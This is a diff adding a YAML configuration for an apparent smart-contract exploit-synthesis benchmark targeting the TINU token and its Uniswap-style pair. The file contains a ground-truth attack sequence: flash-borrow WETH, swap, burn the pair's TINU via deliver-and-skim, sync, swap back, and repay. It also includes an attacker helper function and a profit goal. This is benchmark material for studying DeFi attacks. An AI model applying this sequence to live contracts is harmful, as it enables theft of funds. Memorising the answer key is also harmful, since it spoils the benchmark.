@@ -1,0 +1,57 @@
+# Information for benchmarks building.
+project_name: "TINU"
+
+ctrt_name2cls:
+  - ["tinu", "TINU"]
+  - ["weth", "WBNB"]
+  - ["pair", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+ctrt_name2deploy:
+  - ["tinu", "new TINU(payable(0x9980A74fCBb1936Bc79Ddecbd4148f7511598521), payable(0xEBA4a1e0ff3baF18A9D2910874Ffaee11911Cc31))"]
+  - ["weth", ""]
+  - ["pair", ""]
+  - ["factory", ""]
+  - ["router", ""]
+
+extra_actions:
+  - "function burn_pair_tinu(uint256 amount) internal {
+      tinu.deliver(address(pair), amount);
+      pair.skim(attacker);
+    }"
+
+extra_deployments:
+  - "tinu.afterDeploy(address(router), address(pair));"
+extra_constraints: []
+
+attack_goal: "weth.balanceOf(attacker) >= 1e18 + balanceOfwethattacker"
+
+groundtruth:
+  - ["borrow", "weth", "104.85e18"]
+  - ["swap", "pair", "weth", "tinu", "weth.balanceOf(attacker)"]
+  - ["burn", "pair", "tinu", "tinu.balanceOf(address(pair)) - 1"]
+  - ["sync", "pair"]
+  - ["swap", "pair", "tinu", "weth", "tinu.balanceOf(attacker)"]
+  - ["payback", "weth", "104.85e18 * 1003 / 1000"]
+
+# Information for search space building.
+roles:
+  "weth":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "tinu":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: false
+    is_burnable: true
+  "pair":
+    is_swappair: true
+    uniswap_order: ["tinu", "weth"]
+    support_swaps:
+      "weth": ["tinu", "weth"]
+      "tinu": ["tinu", "weth"]
+    is_oracle: true
+
+pattern: "Token Burn"
